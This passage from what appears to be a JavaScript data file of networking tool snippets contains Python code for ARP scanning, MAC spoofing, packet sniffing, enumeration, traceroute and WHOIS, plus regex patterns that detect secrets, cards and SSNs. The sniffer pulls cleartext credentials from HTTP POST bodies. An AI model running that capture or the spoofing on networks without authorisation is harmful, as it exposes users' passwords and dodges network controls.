            "vendor": get_vendor(received.hwsrc),
        }
        hosts.append(host)

    hosts.sort(key=lambda h: list(map(int, h["ip"].split("."))))
    print(f"\\n{'IP Address':<18} {'MAC Address':<20} {'Vendor'}")
    print("-" * 60)
    for host in hosts:
        print(f"{host['ip']:<18} {host['mac']:<20} {host['vendor']}")
    print(f"\\n[*] {len(hosts)} hosts discovered")
    return hosts

def get_vendor(mac):
    # OUI lookup (first 3 bytes)
    oui_db = {
        "00:0c:29": "VMware",
        "00:50:56": "VMware",
        "08:00:27": "VirtualBox",
        "52:54:00": "QEMU/KVM",
        "00:1a:2b": "Cisco",
        "00:25:b3": "Hewlett-Packard",
        "dc:a6:32": "Raspberry Pi",
        "b8:27:eb": "Raspberry Pi",
        "aa:bb:cc": "Unknown",
    }
    prefix = mac[:8].lower()
    return oui_db.get(prefix, "Unknown")

if __name__ == "__main__":
    network = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.0/24"
    arp_scan(network)`
  },
  {
    name: "MAC Address Changer",
    desc: "Change the MAC address of a network interface for network testing and privacy.",
    code: `import subprocess
import re
import sys
import random

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ifconfig", interface], text=True)
        mac_match = re.search(r"ether\\s+([0-9a-fA-F:]{17})", output)
        if mac_match:
            return mac_match.group(1)
        # Alternative format
        mac_match = re.search(r"HWaddr\\s+([0-9a-fA-F:]{17})", output)
        if mac_match:
            return mac_match.group(1)
    except subprocess.CalledProcessError:
        pass
    return None

def generate_random_mac():
    # Set the locally administered bit and clear multicast bit
    first_byte = random.randint(0, 255) & 0xFE | 0x02
    mac = [first_byte] + [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in mac)

def change_mac(interface, new_mac):
    current = get_current_mac(interface)
    print(f"[*] Interface:   {interface}")
    print(f"[*] Current MAC: {current}")
    print(f"[*] New MAC:     {new_mac}")

    # Validate MAC format
    if not re.match(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$", new_mac):
        print("[!] Invalid MAC address format")
        return False

    try:
        subprocess.check_call(["ifconfig", interface, "down"])
        subprocess.check_call(["ifconfig", interface, "hw", "ether", new_mac])
        subprocess.check_call(["ifconfig", interface, "up"])
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to change MAC: {e}")
        print("[!] This operation requires root privileges")
        return False

    verify = get_current_mac(interface)
    if verify and verify.lower() == new_mac.lower():
        print(f"[+] MAC address successfully changed to {verify}")
        return True
    else:
        print(f"[!] MAC change verification failed (got {verify})")
        return False

def restore_mac(interface, original_mac):
    return change_mac(interface, original_mac)

def list_interfaces():
    try:
        output = subprocess.check_output(["ip", "link", "show"], text=True)
        interfaces = re.findall(r"^\\d+:\\s+(\\S+):", output, re.MULTILINE)
        print("[*] Available interfaces:")
        for iface in interfaces:
            mac = get_current_mac(iface)
            print(f"  {iface:15s} MAC: {mac or 'N/A'}")
        return interfaces
    except subprocess.CalledProcessError:
        return []

if __name__ == "__main__":
    if len(sys.argv) < 2:
        list_interfaces()
        print(f"\\nUsage: python mac_changer.py <interface> [new_mac]")
        print(f"       python mac_changer.py eth0 random")
        sys.exit(0)

    interface = sys.argv[1]
    if len(sys.argv) > 2:
        new_mac = sys.argv[2]
        if new_mac.lower() == "random":
            new_mac = generate_random_mac()
    else:
        new_mac = generate_random_mac()

    change_mac(interface, new_mac)`
  },
  {
    name: "Packet Sniffer with Scapy",
    desc: "Capture and analyze network packets in real-time using Scapy with protocol-level parsing.",
    code: `from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, ARP, ICMP, Raw, Ether
import sys
from collections import Counter
from datetime import datetime

class PacketSniffer:
    def __init__(self):
        self.packet_count = 0
        self.protocols = Counter()
        self.connections = Counter()
        self.dns_queries = []
        self.http_requests = []
        self.credentials = []

    def process_packet(self, packet):
        self.packet_count += 1
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]

        if packet.haslayer(ARP):
            self.protocols["ARP"] += 1
            if packet[ARP].op == 1:  # ARP Request
                print(f"[{timestamp}] ARP Who has {packet[ARP].pdst}? Tell {packet[ARP].psrc}")
            elif packet[ARP].op == 2:  # ARP Reply
                print(f"[{timestamp}] ARP {packet[ARP].psrc} is at {packet[ARP].hwsrc}")

        if packet.haslayer(IP):
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            if packet.haslayer(TCP):
                self.protocols["TCP"] += 1
                sport = packet[TCP].sport
                dport = packet[TCP].dport
                flags = packet[TCP].flags
                self.connections[f"{src_ip}:{sport}->{dst_ip}:{dport}"] += 1

                # HTTP detection
                if packet.haslayer(Raw):
                    payload = packet[Raw].load
                    try:
                        text = payload.decode("utf-8", errors="replace")
                        if text.startswith(("GET ", "POST ", "PUT ", "HEAD ", "DELETE ")):
                            lines = text.split("\\r\\n")
                            print(f"[{timestamp}] HTTP {src_ip} -> {dst_ip}: {lines[0]}")
                            self.http_requests.append(lines[0])

                            # Look for credentials in POST data
                            if text.startswith("POST"):
                                body_start = text.find("\\r\\n\\r\\n")
                                if body_start > 0:
                                    body = text[body_start + 4:]
                                    if any(w in body.lower() for w in ["password", "passwd", "pass", "pwd"]):
                                        print(f"  [!] CREDENTIALS: {body[:200]}")
                                        self.credentials.append(body[:200])
                    except Exception:
                        pass

                # Show SYN/FIN for connection tracking
                if flags & 0x02:  # SYN
                    print(f"[{timestamp}] TCP SYN {src_ip}:{sport} -> {dst_ip}:{dport}")
                elif flags & 0x01:  # FIN
                    print(f"[{timestamp}] TCP FIN {src_ip}:{sport} -> {dst_ip}:{dport}")

            elif packet.haslayer(UDP):
                self.protocols["UDP"] += 1

            if packet.haslayer(DNS) and packet.haslayer(DNSQR):
                self.protocols["DNS"] += 1
                query = packet[DNSQR].qname.decode(errors="replace").rstrip(".")
                print(f"[{timestamp}] DNS {src_ip} -> {query}")
                self.dns_queries.append(query)

            if packet.haslayer(ICMP):
                self.protocols["ICMP"] += 1
                icmp_type = packet[ICMP].type
                type_names = {0: "Echo Reply", 3: "Unreachable", 8: "Echo Request", 11: "TTL Exceeded"}
                type_name = type_names.get(icmp_type, f"Type {icmp_type}")
                print(f"[{timestamp}] ICMP {src_ip} -> {dst_ip} ({type_name})")

    def print_summary(self):
        print(f"\\n=== Sniffing Summary ===")
        print(f"Total packets: {self.packet_count}")
        print(f"\\nProtocols:")
        for proto, count in self.protocols.most_common():
            print(f"  {proto}: {count}")
        print(f"\\nTop Connections:")
        for conn, count in self.connections.most_common(10):
            print(f"  {count:4d}  {conn}")
        if self.dns_queries:
            print(f"\\nDNS Queries: {len(self.dns_queries)} total")
            for q in set(self.dns_queries):
                print(f"  {q}")
        if self.credentials:
            print(f"\\n[!] Captured {len(self.credentials)} potential credential submissions")

if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else None
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    sniffer = PacketSniffer()
    print(f"[*] Starting packet capture (interface={iface or 'default'}, count={count})")
    print(f"[*] Press Ctrl+C to stop\\n")
    try:
        sniff(iface=iface, prn=sniffer.process_packet, count=count, store=False)
    except KeyboardInterrupt:
        pass
    sniffer.print_summary()`
  },
  {
    name: "Network Interface Enumerator",
    desc: "Enumerate network interfaces, IP addresses, and routing information on the local system.",
    code: `import socket
import struct
import fcntl
import sys
import subprocess
import re
import os

def get_interfaces():
    interfaces = []
    try:
        output = subprocess.check_output(["ip", "-j", "addr", "show"], text=True)
        import json
        data = json.loads(output)
        for iface in data:
            info = {
                "name": iface.get("ifname", ""),
                "index": iface.get("ifindex", 0),
                "state": iface.get("operstate", "UNKNOWN"),
                "mac": iface.get("address", ""),
                "mtu": iface.get("mtu", 0),
                "flags": iface.get("flags", []),
                "ipv4": [],
                "ipv6": [],
            }
            for addr_info in iface.get("addr_info", []):
                addr = {
                    "address": addr_info.get("local", ""),
                    "prefix": addr_info.get("prefixlen", 0),
                    "broadcast": addr_info.get("broadcast", ""),
                    "scope": addr_info.get("scope", ""),
                }
                if addr_info.get("family") == "inet":
                    info["ipv4"].append(addr)
                elif addr_info.get("family") == "inet6":
                    info["ipv6"].append(addr)
            interfaces.append(info)
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Fallback to ifconfig
        try:
            output = subprocess.check_output(["ifconfig", "-a"], text=True)
            current = None
            for line in output.split("\\n"):
                iface_match = re.match(r"(\\S+):", line)
                if iface_match:
                    if current:
                        interfaces.append(current)
                    current = {"name": iface_match.group(1), "ipv4": [], "ipv6": [],
                               "mac": "", "state": "", "mtu": 0}
                if current:
                    ip_match = re.search(r"inet\\s+(\\d+\\.\\d+\\.\\d+\\.\\d+)", line)
                    if ip_match:
                        current["ipv4"].append({"address": ip_match.group(1)})
                    mac_match = re.search(r"ether\\s+([0-9a-f:]+)", line)
                    if mac_match:
                        current["mac"] = mac_match.group(1)
            if current:
                interfaces.append(current)
        except Exception:
            pass
    return interfaces

def get_routing_table():
    routes = []
    try:
        output = subprocess.check_output(["ip", "route", "show"], text=True)
        for line in output.strip().split("\\n"):
            routes.append(line.strip())
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    return routes

def get_dns_servers():
    servers = []
    try:
        with open("/etc/resolv.conf", "r") as f:
            for line in f:
                if line.strip().startswith("nameserver"):
                    servers.append(line.strip().split()[1])
    except FileNotFoundError:
        pass
    return servers

def get_listening_ports():
    ports = []
    try:
        output = subprocess.check_output(["ss", "-tlnp"], text=True)
        for line in output.strip().split("\\n")[1:]:
            parts = line.split()
            if len(parts) >= 4:
                ports.append({
                    "state": parts[0],
                    "local": parts[3],
                    "process": parts[-1] if len(parts) > 5 else ""
                })
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    return ports

if __name__ == "__main__":
    print("=== Network Interface Enumeration ===\\n")

    interfaces = get_interfaces()
    for iface in interfaces:
        print(f"Interface: {iface['name']}")
        print(f"  State: {iface.get('state', 'N/A')}")
        print(f"  MAC:   {iface.get('mac', 'N/A')}")
        print(f"  MTU:   {iface.get('mtu', 'N/A')}")
        for addr in iface.get("ipv4", []):
            print(f"  IPv4:  {addr['address']}/{addr.get('prefix', '')}")
        for addr in iface.get("ipv6", []):
            print(f"  IPv6:  {addr['address']}/{addr.get('prefix', '')}")
        print()

    print("--- Routing Table ---")
    for route in get_routing_table():
        print(f"  {route}")

    print(f"\\n--- DNS Servers ---")
    for server in get_dns_servers():
        print(f"  {server}")

    print(f"\\n--- Listening Ports ---")
    for port in get_listening_ports():
        print(f"  {port['local']:25s} {port.get('process', '')}")`
  },
  {
    name: "Traceroute Implementation",
    desc: "Implement traceroute using raw sockets or Scapy to trace the path to a destination.",
    code: `from scapy.all import sr1, IP, TCP, UDP, ICMP, conf
import socket
import sys
import time

conf.verb = 0

def traceroute_icmp(target, max_hops=30, timeout=3):
    try:
        dest_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"[!] Cannot resolve {target}")
        return []

    print(f"Traceroute to {target} ({dest_ip}), {max_hops} hops max")
    hops = []

    for ttl in range(1, max_hops + 1):
        pkt = IP(dst=dest_ip, ttl=ttl) / ICMP()
        start = time.time()
        reply = sr1(pkt, timeout=timeout)
        rtt = (time.time() - start) * 1000

        if reply is None:
            print(f"  {ttl:3d}  * * *  (timeout)")
            hops.append({"hop": ttl, "ip": None, "rtt": None, "hostname": None})
        else:
            src_ip = reply.src
            try:
                hostname = socket.gethostbyaddr(src_ip)[0]
            except socket.herror:
                hostname = src_ip

            print(f"  {ttl:3d}  {hostname} ({src_ip})  {rtt:.2f} ms")
            hops.append({"hop": ttl, "ip": src_ip, "rtt": rtt, "hostname": hostname})

            if src_ip == dest_ip:
                print(f"\\n[*] Reached destination in {ttl} hops")
                break

    return hops

def traceroute_tcp(target, port=80, max_hops=30, timeout=3):
    try:
        dest_ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"[!] Cannot resolve {target}")
        return []

    print(f"TCP Traceroute to {target} ({dest_ip}):{port}, {max_hops} hops max")
    hops = []

    for ttl in range(1, max_hops + 1):
        pkt = IP(dst=dest_ip, ttl=ttl) / TCP(dport=port, flags="S")
        start = time.time()
        reply = sr1(pkt, timeout=timeout)
        rtt = (time.time() - start) * 1000

        if reply is None:
            print(f"  {ttl:3d}  * * *  (timeout)")
            hops.append({"hop": ttl, "ip": None, "rtt": None})
        else:
            src_ip = reply.src
            try:
                hostname = socket.gethostbyaddr(src_ip)[0]
            except socket.herror:
                hostname = src_ip

            # Check if we got a TCP response (destination reached)
            if reply.haslayer(TCP):
                flags = reply[TCP].flags
                if flags & 0x12:  # SYN-ACK
                    print(f"  {ttl:3d}  {hostname} ({src_ip})  {rtt:.2f} ms [SYN-ACK - port open]")
                elif flags & 0x14:  # RST-ACK
                    print(f"  {ttl:3d}  {hostname} ({src_ip})  {rtt:.2f} ms [RST - port closed]")
                hops.append({"hop": ttl, "ip": src_ip, "rtt": rtt, "hostname": hostname})
                break
            else:
                print(f"  {ttl:3d}  {hostname} ({src_ip})  {rtt:.2f} ms")
                hops.append({"hop": ttl, "ip": src_ip, "rtt": rtt, "hostname": hostname})

            if src_ip == dest_ip:
                break

    return hops

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "8.8.8.8"
    method = sys.argv[2] if len(sys.argv) > 2 else "icmp"

    if method == "tcp":
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 80
        traceroute_tcp(target, port=port)
    else:
        traceroute_icmp(target)`
  },
  {
    name: "WHOIS Lookup",
    desc: "Perform WHOIS lookups for domains and IP addresses with parsed output.",
    code: `import socket
import sys
import re

WHOIS_SERVERS = {
    "com": "whois.verisign-grs.com",
    "net": "whois.verisign-grs.com",
    "org": "whois.pir.org",
    "info": "whois.afilias.net",
    "io": "whois.nic.io",
    "co": "whois.nic.co",
    "me": "whois.nic.me",
    "uk": "whois.nic.uk",
    "de": "whois.denic.de",
    "fr": "whois.nic.fr",
    "au": "whois.auda.org.au",
    "ca": "whois.cira.ca",
    "ru": "whois.tcinet.ru",
    "jp": "whois.jprs.jp",
}

def whois_query(server, query, port=43, timeout=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((server, port))
    sock.send((query + "\\r\\n").encode())

    response = b""
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            response += data
        except socket.timeout:
            break
    sock.close()
    return response.decode("utf-8", errors="replace")

def whois_domain(domain):
    parts = domain.lower().strip(".").split(".")
    tld = parts[-1]

    whois_server = WHOIS_SERVERS.get(tld, f"whois.nic.{tld}")
    print(f"[*] Querying {whois_server} for {domain}")

    try:
        raw = whois_query(whois_server, domain)
    except Exception as e:
        print(f"[!] WHOIS query failed: {e}")
        return None

    # Check for referral to another WHOIS server
    referral = re.search(r"Registrar WHOIS Server:\\s*(\\S+)", raw, re.IGNORECASE)
    if referral:
        ref_server = referral.group(1)
        print(f"[*] Following referral to {ref_server}")
        try:
            raw = whois_query(ref_server, domain)
        except Exception:
            pass

    # Parse key fields
    info = {}
    patterns = {
        "registrar": r"Registrar:\\s*(.+)",
        "creation_date": r"Creat(?:ion|ed)\\s*Date:\\s*(.+)",
        "expiry_date": r"Expir(?:y|ation)\\s*Date:\\s*(.+)",
        "updated_date": r"Updated\\s*Date:\\s*(.+)",
        "status": r"Status:\\s*(.+)",
        "name_servers": r"Name\\s*Server:\\s*(\\S+)",
        "registrant_org": r"Registrant\\s*Organi[sz]ation:\\s*(.+)",
        "registrant_country": r"Registrant\\s*Country:\\s*(.+)",
        "dnssec": r"DNSSEC:\\s*(.+)",
    }

    for key, pattern in patterns.items():
        matches = re.findall(pattern, raw, re.IGNORECASE)
        if matches:
            if key in ("name_servers", "status"):
                info[key] = [m.strip() for m in matches]
            else:
                info[key] = matches[0].strip()

    # Print results
    print(f"\\n=== WHOIS: {domain} ===")
    for key, value in info.items():
        if isinstance(value, list):
            print(f"  {key}:")
            for v in value:
                print(f"    {v}")
        else:
            print(f"  {key:22s}: {value}")

    return info

def whois_ip(ip_addr):
    whois_server = "whois.arin.net"
    print(f"[*] Querying {whois_server} for {ip_addr}")
    try:
        raw = whois_query(whois_server, f"n + {ip_addr}")
    except Exception as e:
        print(f"[!] WHOIS query failed: {e}")
        return None

    # Check for referral
    referral = re.search(r"ReferralServer:\\s*whois://([\\w.]+)", raw)
    if referral:
        ref_server = referral.group(1)
        print(f"[*] Following referral to {ref_server}")
        try:
            raw = whois_query(ref_server, ip_addr)
        except Exception:
            pass

    print(f"\\n=== WHOIS: {ip_addr} ===")
    for line in raw.strip().split("\\n"):
        line = line.strip()
        if line and not line.startswith("#") and not line.startswith("%"):
            print(f"  {line}")

    return raw

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    if re.match(r"^\\d+\\.\\d+\\.\\d+\\.\\d+$", target):
        whois_ip(target)
    else:
        whois_domain(target)`
  },
];


const REGEX_PATTERNS = [
  // ============================================================
  // IP ADDRESSES
  // ============================================================
  {
    name: "IPv4 Address",
    pattern: "\\b(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b",
    desc: "Match valid IPv4 addresses (0.0.0.0 to 255.255.255.255).",
    matches: ["192.168.1.1", "10.0.0.1", "255.255.255.0", "172.16.0.1"]
  },
  {
    name: "IPv6 Address",
    pattern: "(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|::(?:[0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}",
    desc: "Match IPv6 addresses in full and abbreviated formats.",
    matches: ["2001:0db8:85a3:0000:0000:8a2e:0370:7334", "fe80::1", "::1"]
  },
  {
    name: "CIDR Notation",
    pattern: "\\b(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\/(?:3[0-2]|[12]?\\d)\\b",
    desc: "Match IPv4 addresses with CIDR subnet notation (/0 to /32).",
    matches: ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/12", "0.0.0.0/0"]
  },
  {
    name: "Private IPv4 Ranges",
    pattern: "\\b(?:10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(?:1[6-9]|2\\d|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})\\b",
    desc: "Match RFC 1918 private IPv4 address ranges.",
    matches: ["10.0.0.1", "172.16.0.1", "172.31.255.255", "192.168.0.1"]
  },
  {
    name: "IPv4 with Port",
    pattern: "\\b(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?):(?:[1-9]\\d{0,3}|[1-5]\\d{4}|6[0-4]\\d{3}|65[0-4]\\d{2}|655[0-2]\\d|6553[0-5])\\b",
    desc: "Match IPv4 addresses followed by a port number (1-65535).",
    matches: ["192.168.1.1:8080", "10.0.0.1:443", "127.0.0.1:3306"]
  },

  // ============================================================
  // EMAILS
  // ============================================================
  {
    name: "Email Address (Standard)",
    pattern: "[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}",
    desc: "Match standard email address format.",
    matches: ["user@example.com", "admin+tag@domain.co.uk", "first.last@company.org"]
  },
  {
    name: "Email Address (Strict RFC 5322)",
    pattern: "(?:[a-zA-Z0-9!#$%&'*+/=?^_`{|}~\\-]+(?:\\.[a-zA-Z0-9!#$%&'*+/=?^_`{|}~\\-]+)*|\"(?:[\\x01-\\x08\\x0b\\x0c\\x0e-\\x1f\\x21\\x23-\\x5b\\x5d-\\x7f]|\\\\[\\x01-\\x09\\x0b\\x0c\\x0e-\\x7f])*\")@(?:(?:[a-zA-Z0-9](?:[a-zA-Z0-9\\-]*[a-zA-Z0-9])?\\.)+[a-zA-Z]{2,})",
    desc: "Match email addresses following RFC 5322 specification more strictly.",
    matches: ["user@example.com", "\"quoted user\"@example.com", "user.name+tag@sub.domain.co"]
  },

  // ============================================================
  // URLS
  // ============================================================
  {
    name: "URL (HTTP/HTTPS)",
    pattern: "https?://[a-zA-Z0-9\\-._~:/?#\\[\\]@!$&'()*+,;=%]+",
    desc: "Match HTTP and HTTPS URLs.",
    matches: ["https://example.com", "http://test.org/path", "https://api.site.co/v1/data?key=val"]
  },
  {
    name: "URL with Path",
    pattern: "https?://(?:[a-zA-Z0-9\\-]+\\.)+[a-zA-Z]{2,}(?:/[a-zA-Z0-9\\-._~:/?#@!$&'()*+,;=%]*)?",
    desc: "Match URLs with optional path components.",
    matches: ["https://example.com/path/to/page", "http://api.test.org/v2/users/123", "https://cdn.site.com/assets/img.png"]
  },
  {
    name: "URL with Query Parameters",
    pattern: "https?://[^\\s]+\\?[^\\s]*=[^\\s]*",
    desc: "Match URLs that contain at least one query parameter.",
    matches: ["https://example.com/search?q=test", "http://api.site.com/data?id=1&type=json", "https://app.com/page?token=abc123"]
  },

  // ============================================================
  // CREDIT CARDS
  // ============================================================
  {
    name: "Visa Card Number",
    pattern: "\\b4[0-9]{12}(?:[0-9]{3})?\\b",
    desc: "Match Visa credit card numbers (13 or 16 digits starting with 4).",
    matches: ["4111111111111111", "4012888888881881", "4222222222222"]
  },
  {
    name: "MasterCard Number",
    pattern: "\\b5[1-5][0-9]{14}\\b",
    desc: "Match MasterCard numbers (16 digits starting with 51-55).",
    matches: ["5500000000000004", "5105105105105100", "5200828282828210"]
  },
  {
    name: "American Express Number",
    pattern: "\\b3[47][0-9]{13}\\b",
    desc: "Match American Express card numbers (15 digits starting with 34 or 37).",
    matches: ["378282246310005", "371449635398431", "340000000000009"]
  },
  {
    name: "Discover Card Number",
    pattern: "\\b6(?:011|5[0-9]{2})[0-9]{12}\\b",
    desc: "Match Discover card numbers (16 digits starting with 6011 or 65).",
    matches: ["6011111111111117", "6500000000000002", "6011000990139424"]
  },

  // ============================================================
  // SSNs
  // ============================================================
  {
    name: "SSN (Standard Format)",
    pattern: "\\b(?!000|666|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0000)\\d{4}\\b",
    desc: "Match US Social Security Numbers in XXX-XX-XXXX format with basic validation.",
    matches: ["123-45-6789", "001-01-0001", "768-12-1234"]
  },
  {
    name: "SSN (No Dashes)",
    pattern: "\\b(?!000|666|9\\d{2})\\d{3}(?!00)\\d{2}(?!0000)\\d{4}\\b",
    desc: "Match US Social Security Numbers without dashes (9 consecutive digits).",
    matches: ["123456789", "001010001", "768121234"]
  },

  // ============================================================
  // API KEYS
  // ============================================================
  {
    name: "AWS Access Key ID",
    pattern: "\\bAKIA[0-9A-Z]{16}\\b",
    desc: "Match AWS Access Key IDs (starts with AKIA followed by 16 uppercase alphanumeric characters).",
    matches: ["AKIAIOSFODNN7EXAMPLE", "AKIAI44QH8DHBEXAMPLE"]
  },
  {
    name: "AWS Secret Access Key",
    pattern: "(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])",
    desc: "Match AWS Secret Access Keys (40-character base64-like string).",
    matches: ["wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]
  },
  {
    name: "GitHub Token (Classic)",
    pattern: "ghp_[A-Za-z0-9_]{36}",
    desc: "Match GitHub Personal Access Tokens (classic format starting with ghp_).",
    matches: ["ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234"]
  },
  {
    name: "Google API Key",
    pattern: "AIza[0-9A-Za-z_-]{35}",
    desc: "Match Google API Keys (starts with AIza followed by 35 characters).",
    matches: ["AIzaSyA1bcDeFgHiJkLmNoPqRsTuVwXyZ0123456"]
  },
  {
    name: "Slack Token",
    pattern: "xox[bporas]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,34}",
    desc: "Match Slack API tokens (bot, user, app tokens).",
    matches: ["<SLACK_BOT_TOKEN>"]
  },
  {
    name: "Generic API Key",
    pattern: "(?:api[_-]?key|apikey|api[_-]?token|access[_-]?token|API[_-]?KEY|API[_-]?TOKEN|Access[_-]?Token)\\s*[:=]\\s*['\"]?([a-zA-Z0-9_\\-]{20,})['\"]?",
    desc: "Match generic API key assignments in code and config files.",
    matches: ["api_key=abcdef1234567890abcdef", "API_TOKEN: '<STRIPE_SECRET_KEY>'", "apiKey=\"a1b2c3d4e5f6g7h8i9j0k1l2m3n4\""]
  },

  // ============================================================
  // JWTs
  // ============================================================
  {
    name: "JSON Web Token (JWT)",
    pattern: "eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*",
    desc: "Match JSON Web Tokens (three base64url-encoded segments separated by dots).",
    matches: ["eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"]
  },
  {
    name: "JWT in Authorization Header",
    pattern: "(?:Authorization|authorization)\\s*:\\s*Bearer\\s+(eyJ[a-zA-Z0-9_-]*\\.eyJ[a-zA-Z0-9_-]*\\.[a-zA-Z0-9_-]*)",
    desc: "Match JWTs in HTTP Authorization Bearer headers.",
    matches: ["Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"]
  },

  // ============================================================
  // PASSWORDS
  // ============================================================
  {
    name: "Password (Minimum Complexity)",
    pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)[a-zA-Z\\d]{8,}$",
    desc: "Match passwords with at least 8 chars, one uppercase, one lowercase, and one digit.",
    matches: ["Password1", "SecurePass99", "MyP4ssword"]
  },
  {
    name: "Strong Password",
    pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[!@#$%^&*()_+\\-=\\[\\]{}|;:'\",.<>?/`~])[A-Za-z\\d!@#$%^&*()_+\\-=\\[\\]{}|;:'\",.<>?/`~]{12,}$",
    desc: "Match strong passwords: 12+ chars with uppercase, lowercase, digit, and special character.",
    matches: ["Str0ng!Pass#1", "C0mpl3x@Pwd!!", "S3cur3_P@ssW0rd"]
  },
  {
    name: "Common Weak Passwords",
    pattern: "^(?:password|123456|12345678|qwerty|abc123|monkey|master|dragon|login|princess|admin|welcome|letmein|trustno1)$",
    desc: "Match commonly used weak passwords from known breach lists.",
    matches: ["password", "123456", "qwerty", "admin", "letmein"]
  },

  // ============================================================
  // FILE PATHS
  // ============================================================
  {
    name: "Unix File Path",
    pattern: "(?:/[a-zA-Z0-9._-]+)+/?",
    desc: "Match Unix/Linux-style absolute file paths.",
    matches: ["/etc/passwd", "/home/user/.ssh/id_rsa", "/var/log/syslog", "/usr/local/bin/python3"]
  },
  {
    name: "Windows File Path",
    pattern: "[a-zA-Z]:\\\\(?:[a-zA-Z0-9._\\- ]+\\\\)*[a-zA-Z0-9._\\- ]*",
    desc: "Match Windows-style file paths with drive letter.",
    matches: ["C:\\Windows\\System32\\cmd.exe", "D:\\Users\\Admin\\Documents\\file.txt", "E:\\Program Files\\app.exe"]
  },
  {
    name: "UNC Path",
    pattern: "\\\\\\\\[a-zA-Z0-9._-]+\\\\[a-zA-Z0-9.$_-]+(?:\\\\[a-zA-Z0-9._\\- ]*)*",
    desc: "Match Windows UNC network paths.",
    matches: ["\\\\server\\share", "\\\\192.168.1.1\\c$\\Users", "\\\\fileserver.domain.com\\data\\files"]
  },

  // ============================================================
  // HASHES
  // ============================================================
  {
    name: "MD5 Hash",
    pattern: "\\b[a-fA-F0-9]{32}\\b",
    desc: "Match MD5 hash values (32 hexadecimal characters).",
    matches: ["d41d8cd98f00b204e9800998ecf8427e", "098f6bcd4621d373cade4e832627b4f6", "5d41402abc4b2a76b9719d911017c592"]
  },
  {
    name: "SHA-1 Hash",
    pattern: "\\b[a-fA-F0-9]{40}\\b",
    desc: "Match SHA-1 hash values (40 hexadecimal characters).",
    matches: ["da39a3ee5e6b4b0d3255bfef95601890afd80709", "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"]
  },
  {
    name: "SHA-256 Hash",
    pattern: "\\b[a-fA-F0-9]{64}\\b",
    desc: "Match SHA-256 hash values (64 hexadecimal characters).",
    matches: ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"]
  },
  {
    name: "SHA-512 Hash",
    pattern: "\\b[a-fA-F0-9]{128}\\b",
    desc: "Match SHA-512 hash values (128 hexadecimal characters).",
    matches: ["cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e"]
  },
  {
    name: "NTLM Hash",
    pattern: "\\b[a-fA-F0-9]{32}\\b",
    desc: "Match NTLM password hashes (32 hexadecimal characters, same as MD5 length).",
    matches: ["31d6cfe0d16ae931b73c59d7e0c089c0", "a4f49c406510bdcab6824ee7c30fd852"]
  },

  // ============================================================
  // NETWORK
  // ============================================================
  {
    name: "MAC Address",
    pattern: "(?:[0-9a-fA-F]{2}[:\\-]){5}[0-9a-fA-F]{2}",
